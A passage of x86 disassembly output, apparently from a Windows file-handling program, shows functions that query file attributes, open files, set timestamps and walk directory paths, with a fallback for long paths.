  402ad5:	50                   	push   %eax
  402ad6:	56                   	push   %esi
  402ad7:	e8 c1 11 00 00       	call   0x403c9d
  402adc:	84 c0                	test   %al,%al
  402ade:	74 12                	je     0x402af2
  402ae0:	8d 85 fc ef ff ff    	lea    -0x1004(%ebp),%eax
  402ae6:	50                   	push   %eax
  402ae7:	ff 15 48 a0 42 00    	call   *0x42a048
  402aed:	85 c0                	test   %eax,%eax
  402aef:	0f 95 c3             	setne  %bl
  402af2:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402af5:	8a c3                	mov    %bl,%al
  402af7:	5e                   	pop    %esi
  402af8:	33 cd                	xor    %ebp,%ecx
  402afa:	5b                   	pop    %ebx
  402afb:	e8 59 3a 01 00       	call   0x416559
  402b00:	c9                   	leave
  402b01:	c2 04 00             	ret    $0x4
  402b04:	ff 74 24 04          	push   0x4(%esp)
  402b08:	e8 09 00 00 00       	call   0x402b16
  402b0d:	83 f8 ff             	cmp    $0xffffffff,%eax
  402b10:	0f 95 c0             	setne  %al
  402b13:	c2 04 00             	ret    $0x4
  402b16:	55                   	push   %ebp
  402b17:	8b ec                	mov    %esp,%ebp
  402b19:	b8 04 10 00 00       	mov    $0x1004,%eax
  402b1e:	e8 dd 3a 01 00       	call   0x416600
  402b23:	a1 5c 56 43 00       	mov    0x43565c,%eax
  402b28:	33 c5                	xor    %ebp,%eax
  402b2a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402b2d:	56                   	push   %esi
  402b2e:	57                   	push   %edi
  402b2f:	8b 7d 08             	mov    0x8(%ebp),%edi
  402b32:	57                   	push   %edi
  402b33:	ff 15 44 a0 42 00    	call   *0x42a044
  402b39:	8b f0                	mov    %eax,%esi
  402b3b:	83 fe ff             	cmp    $0xffffffff,%esi
  402b3e:	75 25                	jne    0x402b65
  402b40:	68 00 08 00 00       	push   $0x800
  402b45:	8d 85 fc ef ff ff    	lea    -0x1004(%ebp),%eax
  402b4b:	50                   	push   %eax
  402b4c:	57                   	push   %edi
  402b4d:	e8 4b 11 00 00       	call   0x403c9d
  402b52:	84 c0                	test   %al,%al
  402b54:	74 0f                	je     0x402b65
  402b56:	8d 85 fc ef ff ff    	lea    -0x1004(%ebp),%eax
  402b5c:	50                   	push   %eax
  402b5d:	ff 15 44 a0 42 00    	call   *0x42a044
  402b63:	8b f0                	mov    %eax,%esi
  402b65:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402b68:	8b c6                	mov    %esi,%eax
  402b6a:	5f                   	pop    %edi
  402b6b:	33 cd                	xor    %ebp,%ecx
  402b6d:	5e                   	pop    %esi
  402b6e:	e8 e6 39 01 00       	call   0x416559
  402b73:	c9                   	leave
  402b74:	c2 04 00             	ret    $0x4
  402b77:	8b 44 24 04          	mov    0x4(%esp),%eax
  402b7b:	24 07                	and    $0x7,%al
  402b7d:	f6 d8                	neg    %al
  402b7f:	1a c0                	sbb    %al,%al
  402b81:	fe c0                	inc    %al
  402b83:	c2 04 00             	ret    $0x4
  402b86:	83 7c 24 04 ff       	cmpl   $0xffffffff,0x4(%esp)
  402b8b:	74 0b                	je     0x402b98
  402b8d:	f6 44 24 04 10       	testb  $0x10,0x4(%esp)
  402b92:	74 04                	je     0x402b98
  402b94:	b0 01                	mov    $0x1,%al
  402b96:	eb 02                	jmp    0x402b9a
  402b98:	32 c0                	xor    %al,%al
  402b9a:	c2 04 00             	ret    $0x4
  402b9d:	8b 44 24 04          	mov    0x4(%esp),%eax
  402ba1:	c1 e8 0a             	shr    $0xa,%eax
  402ba4:	24 01                	and    $0x1,%al
  402ba6:	c2 04 00             	ret    $0x4
  402ba9:	b8 4c 20 00 00       	mov    $0x204c,%eax
  402bae:	e8 4d 3a 01 00       	call   0x416600
  402bb3:	a1 5c 56 43 00       	mov    0x43565c,%eax
  402bb8:	33 c4                	xor    %esp,%eax
  402bba:	89 84 24 48 20 00 00 	mov    %eax,0x2048(%esp)
  402bc1:	53                   	push   %ebx
  402bc2:	8b 9c 24 5c 20 00 00 	mov    0x205c(%esp),%ebx
  402bc9:	55                   	push   %ebp
  402bca:	8b ac 24 58 20 00 00 	mov    0x2058(%esp),%ebp
  402bd1:	56                   	push   %esi
  402bd2:	8b b4 24 60 20 00 00 	mov    0x2060(%esp),%esi
  402bd9:	57                   	push   %edi
  402bda:	55                   	push   %ebp
  402bdb:	e8 53 86 01 00       	call   0x41b233
  402be0:	59                   	pop    %ecx
  402be1:	b9 00 08 00 00       	mov    $0x800,%ecx
  402be6:	3b c1                	cmp    %ecx,%eax
  402be8:	0f 83 1e 01 00 00    	jae    0x402d0c
  402bee:	51                   	push   %ecx
  402bef:	55                   	push   %ebp
  402bf0:	8d 84 24 60 10 00 00 	lea    0x1060(%esp),%eax
  402bf7:	50                   	push   %eax
  402bf8:	e8 7a 44 00 00       	call   0x407077
  402bfd:	56                   	push   %esi
  402bfe:	e8 30 86 01 00       	call   0x41b233
  402c03:	8b f8                	mov    %eax,%edi
  402c05:	59                   	pop    %ecx
  402c06:	85 ff                	test   %edi,%edi
  402c08:	74 1a                	je     0x402c24
  402c0a:	57                   	push   %edi
  402c0b:	8d 84 24 5c 10 00 00 	lea    0x105c(%esp),%eax
  402c12:	56                   	push   %esi
  402c13:	50                   	push   %eax
  402c14:	e8 b2 a9 01 00       	call   0x41d5cb
  402c19:	83 c4 0c             	add    $0xc,%esp
  402c1c:	f7 d8                	neg    %eax
  402c1e:	1b c0                	sbb    %eax,%eax
  402c20:	f7 d0                	not    %eax
  402c22:	23 f8                	and    %eax,%edi
  402c24:	33 c0                	xor    %eax,%eax
  402c26:	8b f0                	mov    %eax,%esi
  402c28:	66 39 84 24 58 10 00 	cmp    %ax,0x1058(%esp)
  402c2f:	00 
  402c30:	74 3a                	je     0x402c6c
  402c32:	3b 73 10             	cmp    0x10(%ebx),%esi
  402c35:	73 35                	jae    0x402c6c
  402c37:	83 7b 14 08          	cmpl   $0x8,0x14(%ebx)
  402c3b:	8b c3                	mov    %ebx,%eax
  402c3d:	72 02                	jb     0x402c41
  402c3f:	8b 03                	mov    (%ebx),%eax
  402c41:	0f b7 8c 74 58 10 00 	movzwl 0x1058(%esp,%esi,2),%ecx
  402c48:	00 
  402c49:	66 3b 0c 70          	cmp    (%eax,%esi,2),%cx
  402c4d:	75 1d                	jne    0x402c6c
  402c4f:	51                   	push   %ecx
  402c50:	e8 5e 12 00 00       	call   0x403eb3
  402c55:	84 c0                	test   %al,%al
  402c57:	74 06                	je     0x402c5f
  402c59:	3b f7                	cmp    %edi,%esi
  402c5b:	76 02                	jbe    0x402c5f
  402c5d:	8b fe                	mov    %esi,%edi
  402c5f:	46                   	inc    %esi
  402c60:	33 c0                	xor    %eax,%eax
  402c62:	66 39 84 74 58 10 00 	cmp    %ax,0x1058(%esp,%esi,2)
  402c69:	00 
  402c6a:	75 c6                	jne    0x402c32
  402c6c:	8d b4 24 58 10 00 00 	lea    0x1058(%esp),%esi
  402c73:	85 ff                	test   %edi,%edi
  402c75:	74 15                	je     0x402c8c
  402c77:	8d 34 7e             	lea    (%esi,%edi,2),%esi
  402c7a:	eb 03                	jmp    0x402c7f
  402c7c:	83 c6 02             	add    $0x2,%esi
  402c7f:	0f b7 06             	movzwl (%esi),%eax
  402c82:	50                   	push   %eax
  402c83:	e8 2b 12 00 00       	call   0x403eb3
  402c88:	84 c0                	test   %al,%al
  402c8a:	75 f0                	jne    0x402c7c
  402c8c:	8d 84 24 58 10 00 00 	lea    0x1058(%esp),%eax
  402c93:	50                   	push   %eax
  402c94:	e8 9a 85 01 00       	call   0x41b233
  402c99:	59                   	pop    %ecx
  402c9a:	8d bc 44 56 10 00 00 	lea    0x1056(%esp,%eax,2),%edi
  402ca1:	eb 51                	jmp    0x402cf4
  402ca3:	0f b7 07             	movzwl (%edi),%eax
  402ca6:	50                   	push   %eax
  402ca7:	e8 07 12 00 00       	call   0x403eb3
  402cac:	84 c0                	test   %al,%al
  402cae:	74 41                	je     0x402cf1
  402cb0:	33 c0                	xor    %eax,%eax
  402cb2:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  402cb6:	66 89 07             	mov    %ax,(%edi)
  402cb9:	e8 8c ef ff ff       	call   0x401c4a
  402cbe:	6a 01                	push   $0x1
  402cc0:	8d 44 24 14          	lea    0x14(%esp),%eax
  402cc4:	50                   	push   %eax
  402cc5:	8d 84 24 60 10 00 00 	lea    0x1060(%esp),%eax
  402ccc:	50                   	push   %eax
  402ccd:	e8 30 04 00 00       	call   0x403102
  402cd2:	84 c0                	test   %al,%al
  402cd4:	74 1b                	je     0x402cf1
  402cd6:	80 bc 24 1d 10 00 00 	cmpb   $0x0,0x101d(%esp)
  402cdd:	00 
  402cde:	74 11                	je     0x402cf1
  402ce0:	8d 84 24 58 10 00 00 	lea    0x1058(%esp),%eax
  402ce7:	50                   	push   %eax
  402ce8:	e8 4b fd ff ff       	call   0x402a38
  402ced:	84 c0                	test   %al,%al
  402cef:	74 1b                	je     0x402d0c
  402cf1:	83 ef 02             	sub    $0x2,%edi
  402cf4:	3b fe                	cmp    %esi,%edi
  402cf6:	77 ab                	ja     0x402ca3
  402cf8:	55                   	push   %ebp
  402cf9:	e8 35 85 01 00       	call   0x41b233
  402cfe:	59                   	pop    %ecx
  402cff:	50                   	push   %eax
  402d00:	55                   	push   %ebp
  402d01:	8b cb                	mov    %ebx,%ecx
  402d03:	e8 40 03 00 00       	call   0x403048
  402d08:	b0 01                	mov    $0x1,%al
  402d0a:	eb 02                	jmp    0x402d0e
  402d0c:	32 c0                	xor    %al,%al
  402d0e:	8b 8c 24 58 20 00 00 	mov    0x2058(%esp),%ecx
  402d15:	5f                   	pop    %edi
  402d16:	5e                   	pop    %esi
  402d17:	5d                   	pop    %ebp
  402d18:	5b                   	pop    %ebx
  402d19:	33 cc                	xor    %esp,%ecx
  402d1b:	e8 39 38 01 00       	call   0x416559
  402d20:	81 c4 4c 20 00 00    	add    $0x204c,%esp
  402d26:	c2 0c 00             	ret    $0xc
  402d29:	55                   	push   %ebp
  402d2a:	8b ec                	mov    %esp,%ebp
  402d2c:	b8 04 10 00 00       	mov    $0x1004,%eax
  402d31:	e8 ca 38 01 00       	call   0x416600
  402d36:	a1 5c 56 43 00       	mov    0x43565c,%eax
  402d3b:	33 c5                	xor    %ebp,%eax
  402d3d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402d40:	56                   	push   %esi
  402d41:	8b 75 08             	mov    0x8(%ebp),%esi
  402d44:	56                   	push   %esi
  402d45:	e8 c3 12 00 00       	call   0x40400d
  402d4a:	0f b7 00             	movzwl (%eax),%eax
  402d4d:	83 f8 2e             	cmp    $0x2e,%eax
  402d50:	74 12                	je     0x402d64
  402d52:	83 f8 20             	cmp    $0x20,%eax
  402d55:	74 0d                	je     0x402d64
  402d57:	6a 00                	push   $0x0
  402d59:	56                   	push   %esi
  402d5a:	ff 15 38 a0 42 00    	call   *0x42a038
  402d60:	85 c0                	test   %eax,%eax
  402d62:	75 33                	jne    0x402d97
  402d64:	56                   	push   %esi
  402d65:	e8 9a fd ff ff       	call   0x402b04
  402d6a:	84 c0                	test   %al,%al
  402d6c:	75 3c                	jne    0x402daa
  402d6e:	68 00 08 00 00       	push   $0x800
  402d73:	8d 85 fc ef ff ff    	lea    -0x1004(%ebp),%eax
  402d79:	50                   	push   %eax
  402d7a:	56                   	push   %esi
  402d7b:	e8 1d 0f 00 00       	call   0x403c9d
  402d80:	84 c0                	test   %al,%al
  402d82:	74 26                	je     0x402daa
  402d84:	6a 00                	push   $0x0
  402d86:	8d 85 fc ef ff ff    	lea    -0x1004(%ebp),%eax
  402d8c:	50                   	push   %eax
  402d8d:	ff 15 38 a0 42 00    	call   *0x42a038
  402d93:	85 c0                	test   %eax,%eax
  402d95:	74 13                	je     0x402daa
  402d97:	80 7d 0c 00          	cmpb   $0x0,0xc(%ebp)
  402d9b:	74 09                	je     0x402da6
  402d9d:	ff 75 10             	push   0x10(%ebp)
  402da0:	56                   	push   %esi
  402da1:	e8 dc 01 00 00       	call   0x402f82
  402da6:	33 c0                	xor    %eax,%eax
  402da8:	eb 18                	jmp    0x402dc2
  402daa:	ff 15 00 a0 42 00    	call   *0x42a000
  402db0:	8b c8                	mov    %eax,%ecx
  402db2:	6a 02                	push   $0x2
  402db4:	58                   	pop    %eax
  402db5:	3b c8                	cmp    %eax,%ecx
  402db7:	74 09                	je     0x402dc2
  402db9:	33 c0                	xor    %eax,%eax
  402dbb:	83 f9 03             	cmp    $0x3,%ecx
  402dbe:	0f 94 c0             	sete   %al
  402dc1:	40                   	inc    %eax
  402dc2:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402dc5:	33 cd                	xor    %ebp,%ecx
  402dc7:	5e                   	pop    %esi
  402dc8:	e8 8c 37 01 00       	call   0x416559
  402dcd:	c9                   	leave
  402dce:	c2 0c 00             	ret    $0xc
  402dd1:	6a 00                	push   $0x0
  402dd3:	ff 74 24 08          	push   0x8(%esp)
  402dd7:	e8 a6 01 00 00       	call   0x402f82
  402ddc:	c2 04 00             	ret    $0x4
  402ddf:	b8 2c 10 00 00       	mov    $0x102c,%eax
  402de4:	e8 17 38 01 00       	call   0x416600
  402de9:	a1 5c 56 43 00       	mov    0x43565c,%eax
  402dee:	33 c4                	xor    %esp,%eax
  402df0:	89 84 24 28 10 00 00 	mov    %eax,0x1028(%esp)
  402df7:	8b 8c 24 3c 10 00 00 	mov    0x103c(%esp),%ecx
  402dfe:	33 d2                	xor    %edx,%edx
  402e00:	53                   	push   %ebx
  402e01:	55                   	push   %ebp
  402e02:	8b ac 24 38 10 00 00 	mov    0x1038(%esp),%ebp
  402e09:	33 db                	xor    %ebx,%ebx
  402e0b:	56                   	push   %esi
  402e0c:	8b b4 24 40 10 00 00 	mov    0x1040(%esp),%esi
  402e13:	43                   	inc    %ebx
  402e14:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  402e18:	57                   	push   %edi
  402e19:	8b bc 24 48 10 00 00 	mov    0x1048(%esp),%edi
  402e20:	85 f6                	test   %esi,%esi
  402e22:	74 0b                	je     0x402e2f
  402e24:	8b 06                	mov    (%esi),%eax
  402e26:	0b 46 04             	or     0x4(%esi),%eax
  402e29:	88 5c 24 11          	mov    %bl,0x11(%esp)
  402e2d:	75 04                	jne    0x402e33
  402e2f:	88 54 24 11          	mov    %dl,0x11(%esp)
  402e33:	85 ff                	test   %edi,%edi
  402e35:	74 0b                	je     0x402e42
  402e37:	8b 07                	mov    (%edi),%eax
  402e39:	0b 47 04             	or     0x4(%edi),%eax
  402e3c:	88 5c 24 13          	mov    %bl,0x13(%esp)
  402e40:	75 04                	jne    0x402e46
  402e42:	88 54 24 13          	mov    %dl,0x13(%esp)
  402e46:	85 c9                	test   %ecx,%ecx
  402e48:	74 0b                	je     0x402e55
  402e4a:	8b 01                	mov    (%ecx),%eax
  402e4c:	0b 41 04             	or     0x4(%ecx),%eax
  402e4f:	88 5c 24 12          	mov    %bl,0x12(%esp)
  402e53:	75 04                	jne    0x402e59
  402e55:	88 54 24 12          	mov    %dl,0x12(%esp)
  402e59:	55                   	push   %ebp
  402e5a:	e8 b7 fc ff ff       	call   0x402b16
  402e5f:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  402e63:	83 f8 ff             	cmp    $0xffffffff,%eax
  402e66:	74 0e                	je     0x402e76
  402e68:	84 c3                	test   %al,%bl
  402e6a:	74 0a                	je     0x402e76
  402e6c:	6a 00                	push   $0x0
  402e6e:	55                   	push   %ebp
  402e6f:	e8 0e 01 00 00       	call   0x402f82
  402e74:	eb 02                	jmp    0x402e78
  402e76:	32 db                	xor    %bl,%bl
  402e78:	6a 00                	push   $0x0
  402e7a:	68 00 00 00 02       	push   $0x2000000
  402e7f:	6a 03                	push   $0x3
  402e81:	6a 00                	push   $0x0
  402e83:	6a 03                	push   $0x3
  402e85:	68 00 00 00 40       	push   $0x40000000
  402e8a:	55                   	push   %ebp
  402e8b:	ff 15 30 a0 42 00    	call   *0x42a030
  402e91:	89 44 24 14          	mov    %eax,0x14(%esp)
  402e95:	83 f8 ff             	cmp    $0xffffffff,%eax
  402e98:	75 42                	jne    0x402edc
  402e9a:	68 00 08 00 00       	push   $0x800
  402e9f:	8d 44 24 3c          	lea    0x3c(%esp),%eax
  402ea3:	50                   	push   %eax
  402ea4:	55                   	push   %ebp
  402ea5:	e8 f3 0d 00 00       	call   0x403c9d
  402eaa:	84 c0                	test   %al,%al
  402eac:	0f 84 b5 00 00 00    	je     0x402f67
  402eb2:	6a 00                	push   $0x0
  402eb4:	68 00 00 00 02       	push   $0x2000000
  402eb9:	6a 03                	push   $0x3
  402ebb:	6a 00                	push   $0x0
  402ebd:	6a 03                	push   $0x3
  402ebf:	68 00 00 00 40       	push   $0x40000000
  402ec4:	8d 44 24 50          	lea    0x50(%esp),%eax
  402ec8:	50                   	push   %eax
  402ec9:	ff 15 30 a0 42 00    	call   *0x42a030
  402ecf:	89 44 24 14          	mov    %eax,0x14(%esp)
  402ed3:	83 f8 ff             	cmp    $0xffffffff,%eax
  402ed6:	0f 84 8b 00 00 00    	je     0x402f67
  402edc:	80 7c 24 11 00       	cmpb   $0x0,0x11(%esp)
  402ee1:	74 0c                	je     0x402eef
  402ee3:	8d 44 24 20          	lea    0x20(%esp),%eax
  402ee7:	8b ce                	mov    %esi,%ecx
  402ee9:	50                   	push   %eax
  402eea:	e8 3f 4a 00 00       	call   0x40792e
  402eef:	80 7c 24 13 00       	cmpb   $0x0,0x13(%esp)
  402ef4:	74 0c                	je     0x402f02
  402ef6:	8d 44 24 30          	lea    0x30(%esp),%eax
  402efa:	8b cf                	mov    %edi,%ecx
  402efc:	50                   	push   %eax
  402efd:	e8 2c 4a 00 00       	call   0x40792e
  402f02:	80 7c 24 12 00       	cmpb   $0x0,0x12(%esp)
  402f07:	74 0e                	je     0x402f17
  402f09:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  402f0d:	8d 44 24 28          	lea    0x28(%esp),%eax
  402f11:	50                   	push   %eax
  402f12:	e8 17 4a 00 00       	call   0x40792e
  402f17:	0f b6 44 24 11       	movzbl 0x11(%esp),%eax
  402f1c:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  402f20:	f7 d8                	neg    %eax
  402f22:	8b 74 24 14          	mov    0x14(%esp),%esi
  402f26:	1b c0                	sbb    %eax,%eax
  402f28:	23 c1                	and    %ecx,%eax
  402f2a:	8d 4c 24 28          	lea    0x28(%esp),%ecx
  402f2e:	50                   	push   %eax
  402f2f:	0f b6 44 24 16       	movzbl 0x16(%esp),%eax
  402f34:	f7 d8                	neg    %eax
  402f36:	1b c0                	sbb    %eax,%eax
  402f38:	23 c1                	and    %ecx,%eax
  402f3a:	8d 4c 24 34          	lea    0x34(%esp),%ecx
  402f3e:	50                   	push   %eax
  402f3f:	0f b6 44 24 1b       	movzbl 0x1b(%esp),%eax
  402f44:	f7 d8                	neg    %eax
  402f46:	1b c0                	sbb    %eax,%eax
  402f48:	23 c1                	and    %ecx,%eax
  402f4a:	50                   	push   %eax
  402f4b:	56                   	push   %esi
  402f4c:	ff 15 28 a0 42 00    	call   *0x42a028
  402f52:	56                   	push   %esi
  402f53:	ff 15 2c a0 42 00    	call   *0x42a02c
  402f59:	84 db                	test   %bl,%bl
  402f5b:	74 0a                	je     0x402f67
  402f5d:	ff 74 24 1c          	push   0x1c(%esp)
  402f61:	55                   	push   %ebp
  402f62:	e8 1b 00 00 00       	call   0x402f82
  402f67:	8b 8c 24 38 10 00 00 	mov    0x1038(%esp),%ecx
  402f6e:	5f                   	pop    %edi
  402f6f:	5e                   	pop    %esi
  402f70:	5d                   	pop    %ebp
  402f71:	5b                   	pop    %ebx
  402f72:	33 cc                	xor    %esp,%ecx
  402f74:	e8 e0 35 01 00       	call   0x416559
  402f79:	81 c4 2c 10 00 00    	add    $0x102c,%esp
  402f7f:	c2 10 00             	ret    $0x10
  402f82:	55                   	push   %ebp
  402f83:	8b ec                	mov    %esp,%ebp
  402f85:	b8 04 10 00 00       	mov    $0x1004,%eax
  402f8a:	e8 71 36 01 00       	call   0x416600
  402f8f:	a1 5c 56 43 00       	mov    0x43565c,%eax
  402f94:	33 c5                	xor    %ebp,%eax
  402f96:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402f99:	53                   	push   %ebx
  402f9a:	56                   	push   %esi
  402f9b:	ff 75 0c             	push   0xc(%ebp)
  402f9e:	8b 75 08             	mov    0x8(%ebp),%esi
  402fa1:	56                   	push   %esi
  402fa2:	ff 15 40 a0 42 00    	call   *0x42a040
  402fa8:	85 c0                	test   %eax,%eax
  402faa:	0f 95 c3             	setne  %bl
  402fad:	85 c0                	test   %eax,%eax
  402faf:	75 2b                	jne    0x402fdc
  402fb1:	68 00 08 00 00       	push   $0x800
  402fb6:	8d 85 fc ef ff ff    	lea    -0x1004(%ebp),%eax
  402fbc:	50                   	push   %eax
  402fbd:	56                   	push   %esi
  402fbe:	e8 da 0c 00 00       	call   0x403c9d
  402fc3:	84 c0                	test   %al,%al
  402fc5:	74 15                	je     0x402fdc
  402fc7:	ff 75 0c             	push   0xc(%ebp)
  402fca:	8d 85 fc ef ff ff    	lea    -0x1004(%ebp),%eax
  402fd0:	50                   	push   %eax
  402fd1:	ff 15 40 a0 42 00    	call   *0x42a040
  402fd7:	85 c0                	test   %eax,%eax
  402fd9:	0f 95 c3             	setne  %bl
  402fdc:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402fdf:	8a c3                	mov    %bl,%al
  402fe1:	5e                   	pop    %esi
  402fe2:	33 cd                	xor    %ebp,%ecx
  402fe4:	5b                   	pop    %ebx
  402fe5:	e8 6f 35 01 00       	call   0x416559
  402fea:	c9                   	leave
  402feb:	c2 08 00             	ret    $0x8
  402fee:	55                   	push   %ebp
  402fef:	8b ec                	mov    %esp,%ebp
  402ff1:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402ff4:	83 c9 07             	or     $0x7,%ecx
  402ff7:	56                   	push   %esi
  402ff8:	3b 4d 10             	cmp    0x10(%ebp),%ecx
  402ffb:	77 1b                	ja     0x403018
  402ffd:	8b 75 0c             	mov    0xc(%ebp),%esi
  403000:	8b d6                	mov    %esi,%edx
  403002:	8b 45 10             	mov    0x10(%ebp),%eax
  403005:	d1 ea                	shr    $1,%edx
  403007:	2b c2                	sub    %edx,%eax
  403009:	3b f0                	cmp    %eax,%esi
  40300b:	77 0b                	ja     0x403018
  40300d:	8d 04 32             	lea    (%edx,%esi,1),%eax
  403010:	3b c8                	cmp    %eax,%ecx
  403012:	72 07                	jb     0x40301b
  403014:	8b c1                	mov    %ecx,%eax
  403016:	eb 03                	jmp    0x40301b
  403018:	8b 45 10             	mov    0x10(%ebp),%eax
  40301b:	5e                   	pop    %esi
  40301c:	5d                   	pop    %ebp
  40301d:	c2 0c 00             	ret    $0xc
  403020:	55                   	push   %ebp
  403021:	8b ec                	mov    %esp,%ebp
  403023:	83 ec 0c             	sub    $0xc,%esp
  403026:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  403029:	e8 6a f8 ff ff       	call   0x402898
  40302e:	68 0c 27 43 00       	push   $0x43270c
  403033:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403036:	50                   	push   %eax
  403037:	e8 14 4c 01 00       	call   0x417c50
  40303c:	cc                   	int3
  40303d:	68 d0 a5 42 00       	push   $0x42a5d0
  403042:	e8 86 34 01 00       	call   0x4164cd
  403047:	cc                   	int3
  403048:	55                   	push   %ebp
  403049:	8b ec                	mov    %esp,%ebp
  40304b:	51                   	push   %ecx
  40304c:	56                   	push   %esi
  40304d:	8b f1                	mov    %ecx,%esi
  40304f:	57                   	push   %edi
  403050:	8b 7d 0c             	mov    0xc(%ebp),%edi
  403053:	3b 7e 14             	cmp    0x14(%esi),%edi
  403056:	77 23                	ja     0x40307b
  403058:	83 7e 14 08          	cmpl   $0x8,0x14(%esi)
  40305c:	53                   	push   %ebx
  40305d:	8b de                	mov    %esi,%ebx
  40305f:	72 02                	jb     0x403063
  403061:	8b 1e                	mov    (%esi),%ebx
  403063:	57                   	push   %edi
  403064:	ff 75 08             	push   0x8(%ebp)
  403067:	89 7e 10             	mov    %edi,0x10(%esi)
  40306a:	53                   	push   %ebx
  40306b:	e8 21 00 00 00       	call   0x403091
  403070:	33 c0                	xor    %eax,%eax
  403072:	66 89 04 7b          	mov    %ax,(%ebx,%edi,2)
  403076:	8b c6                	mov    %esi,%eax
  403078:	5b                   	pop    %ebx
  403079:	eb 10                	jmp    0x40308b
  40307b:	ff 75 08             	push   0x8(%ebp)
  40307e:	c6 45 fc 00          	movb   $0x0,-0x4(%ebp)
  403082:	ff 75 fc             	push   -0x4(%ebp)
  403085:	57                   	push   %edi
  403086:	e8 50 f7 ff ff       	call   0x4027db
  40308b:	5f                   	pop    %edi
  40308c:	5e                   	pop    %esi
  40308d:	c9                   	leave
  40308e:	c2 08 00             	ret    $0x8
  403091:	8b 44 24 0c          	mov    0xc(%esp),%eax
  403095:	03 c0                	add    %eax,%eax
  403097:	50                   	push   %eax
  403098:	ff 74 24 0c          	push   0xc(%esp)
  40309c:	ff 74 24 0c          	push   0xc(%esp)
  4030a0:	e8 9b 4c 01 00       	call   0x417d40
  4030a5:	8b 44 24 10          	mov    0x10(%esp),%eax
  4030a9:	83 c4 0c             	add    $0xc,%esp
  4030ac:	c2 0c 00             	ret    $0xc
  4030af:	cc                   	int3
  4030b0:	8b 41 04             	mov    0x4(%ecx),%eax
  4030b3:	85 c0                	test   %eax,%eax
  4030b5:	75 05                	jne    0x4030bc
  4030b7:	b8 a4 a5 42 00       	mov    $0x42a5a4,%eax
  4030bc:	c3                   	ret
  4030bd:	8d 44 24 10          	lea    0x10(%esp),%eax
  4030c1:	50                   	push   %eax
  4030c2:	6a 00                	push   $0x0
  4030c4:	ff 74 24 14          	push   0x14(%esp)
  4030c8:	ff 74 24 14          	push   0x14(%esp)
  4030cc:	ff 74 24 14          	push   0x14(%esp)
  4030d0:	e8 04 eb ff ff       	call   0x401bd9
  4030d5:	83 c4 14             	add    $0x14,%esp
  4030d8:	c3                   	ret
  4030d9:	83 89 04 10 00 00 ff 	orl    $0xffffffff,0x1004(%ecx)
  4030e0:	33 c0                	xor    %eax,%eax
  4030e2:	66 89 01             	mov    %ax,(%ecx)
  4030e5:	8b c1                	mov    %ecx,%eax
  4030e7:	c6 81 00 10 00 00 01 	movb   $0x1,0x1000(%ecx)
  4030ee:	c3                   	ret
  4030ef:	8b 81 04 10 00 00    	mov    0x1004(%ecx),%eax
  4030f5:	83 f8 ff             	cmp    $0xffffffff,%eax
  4030f8:	74 07                	je     0x403101
  4030fa:	50                   	push   %eax
  4030fb:	ff 15 50 a0 42 00    	call   *0x42a050
  403101:	c3                   	ret
  403102:	56                   	push   %esi
  403103:	8b 74 24 0c          	mov    0xc(%esp),%esi
  403107:	ff 74 24 08          	push   0x8(%esp)
  40310b:	c6 86 44 10 00 00 00 	movb   $0x0,0x1044(%esi)
  403112:	e8 b3 0d 00 00       	call   0x403eca
  403117:	84 c0                	test   %al,%al
  403119:	75 45                	jne    0x403160
  40311b:	56                   	push   %esi
  40311c:	ff 74 24 0c          	push   0xc(%esp)
  403120:	6a ff                	push   $0xffffffff
  403122:	e8 09 01 00 00       	call   0x403230
  403127:	83 f8 ff             	cmp    $0xffffffff,%eax
  40312a:	74 34                	je     0x403160
  40312c:	50                   	push   %eax
  40312d:	ff 15 50 a0 42 00    	call   *0x42a050
  403133:	ff b6 08 10 00 00    	push   0x1008(%esi)
  403139:	83 a6 40 10 00 00 00 	andl   $0x0,0x1040(%esi)
  403140:	e8 41 fa ff ff       	call   0x402b86
  403145:	ff b6 08 10 00 00    	push   0x1008(%esi)
  40314b:	88 86 0c 10 00 00    	mov    %al,0x100c(%esi)
  403151:	e8 47 fa ff ff       	call   0x402b9d
  403156:	88 86 0d 10 00 00    	mov    %al,0x100d(%esi)
  40315c:	b0 01                	mov    $0x1,%al
  40315e:	eb 02                	jmp    0x403162
  403160:	32 c0                	xor    %al,%al
  403162:	5e                   	pop    %esi
  403163:	c2 0c 00             	ret    $0xc
  403166:	53                   	push   %ebx
  403167:	56                   	push   %esi
  403168:	57                   	push   %edi
  403169:	8b 7c 24 10          	mov    0x10(%esp),%edi
  40316d:	8b f1                	mov    %ecx,%esi
  40316f:	e9 82 00 00 00       	jmp    0x4031f6
  403174:	80 be 00 10 00 00 00 	cmpb   $0x0,0x1000(%esi)
  40317b:	57                   	push   %edi
  40317c:	56                   	push   %esi
  40317d:	74 0f                	je     0x40318e
  40317f:	6a ff                	push   $0xffffffff
  403181:	e8 aa 00 00 00       	call   0x403230
  403186:	89 86 04 10 00 00    	mov    %eax,0x1004(%esi)
  40318c:	eb 0b                	jmp    0x403199
  40318e:	ff b6 04 10 00 00    	push   0x1004(%esi)
  403194:	e8 97 00 00 00       	call   0x403230
  403199:	83 f8 ff             	cmp    $0xffffffff,%eax
  40319c:	74 69                	je     0x403207
  40319e:	ff b7 08 10 00 00    	push   0x1008(%edi)
  4031a4:	89 9f 40 10 00 00    	mov    %ebx,0x1040(%edi)
  4031aa:	e8 d7 f9 ff ff       	call   0x402b86
  4031af:	ff b7 08 10 00 00    	push   0x1008(%edi)
  4031b5:	88 87 0c 10 00 00    	mov    %al,0x100c(%edi)
  4031bb:	e8 dd f9 ff ff       	call   0x402b9d
  4031c0:	88 87 0d 10 00 00    	mov    %al,0x100d(%edi)
  4031c6:	57                   	push   %edi
  4031c7:	88 9e 00 10 00 00    	mov    %bl,0x1000(%esi)
  4031cd:	e8 57 0e 00 00       	call   0x404029
  4031d2:	8b d8                	mov    %eax,%ebx
  4031d4:	68 e0 a5 42 00       	push   $0x42a5e0
